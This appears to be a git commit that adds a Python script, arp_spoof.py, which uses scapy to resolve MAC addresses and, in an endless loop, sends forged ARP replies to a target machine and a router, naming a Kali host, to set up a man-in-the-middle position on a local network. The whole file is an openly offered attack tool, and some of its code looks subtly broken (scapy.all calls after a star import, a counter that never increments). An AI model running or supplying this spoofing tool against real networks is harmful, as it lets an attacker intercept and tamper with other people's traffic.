d6a0c3c08ae1b935fcba68b48cbe796c8d5dd997
Mario Zelaya <mariozelaya23@gmail.com>
2022-03-28 12:20:47 -0500

    adding get_mac and spoof function and adding a loop to send the packages to the machine and router

---
+++ arp_spoof.py
@@ -0,0 +1,28 @@
+#!/usr/bin/env python
+import time
+from scapy.all import *
+
+
+def get_mac(ip):
+    arp_request = scapy.all.ARP(pdst=ip)
+    broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.all.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.all.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.all.send(packet, verbose=False)
+
+
+sent_packages_count = 0
+
+
+while True:
+    spoof("192.168.2.79", "192.168.1.1")  # target ip and router ip
+    spoof("192.168.1.1", "192.168.2.75")  # router ip and kali ip
+    print("[+] Two packages sent " + str(sent_packages_count))
+    time.sleep(2)
